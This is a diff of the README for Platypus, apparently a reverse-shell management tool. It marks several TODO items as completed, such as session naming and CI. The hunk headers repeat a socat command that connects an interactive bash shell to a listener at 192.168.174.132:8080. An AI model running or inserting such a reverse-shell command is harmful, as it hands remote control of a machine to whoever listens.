@@ -112,17 +112,10 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
 * [Demo Video](http://www.youtube.com/watch?v=Yfy6w8qXcQs "Platypus")
 
 ## TODOs
-- [ ] [#7 Allow user to choose operation for the same IP income connection](https://github.com/WangYihang/Platypus/issues/7)
-- [ ] [#25 Replace new connection from same IP with old one](https://github.com/WangYihang/Platypus/issues/25)
 - [ ] [#10 Use database to record all events and interacting logs](https://github.com/WangYihang/Platypus/issues/10)
-- [ ] [#12 Add capability of setting human-readable name of session](https://github.com/WangYihang/Platypus/issues/12)
 - [ ] [#15 Encryption support](https://github.com/WangYihang/Platypus/issues/15)
-- [ ] [#19 Read command file when start up](https://github.com/WangYihang/Platypus/issues/19)
 - [ ] [#24 Upgrading platypus to a system service](https://github.com/WangYihang/Platypus/issues/24)
 - [ ] Upgrade to Metepreter session
-- [ ] Test driven development [WIP]
-- [ ] Continuous Integration
-- [ ] Heart beating packet
 - [ ] More interfaces in RESTful API
 - [ ] RESTful API should auth
 - [ ] Use crontab
@@ -131,6 +124,12 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
 - [ ] List file
 - [ ] Web UI
 - [ ] Benchmark
+- [x] Continuous Integration
+- [x] [#12 Add capability of setting human-readable name of session](https://github.com/WangYihang/Platypus/issues/12)
+- [x] [#7 Allow user to choose operation for the same IP income connection](https://github.com/WangYihang/Platypus/issues/7)
+- [x] [#25 Replace new connection from same IP with old one](https://github.com/WangYihang/Platypus/issues/25)
+- [x] Test driven development [WIP]
+- [x] [#19 Read command file when start up](https://github.com/WangYihang/Platypus/issues/19)
 - [x] Add config file
 - [x] [#30 RaaS support specifying language, thanks for @RicterZ](https://github.com/WangYihang/Platypus/issues/30)  
 - [x] Execute user input when input is not a built-in command
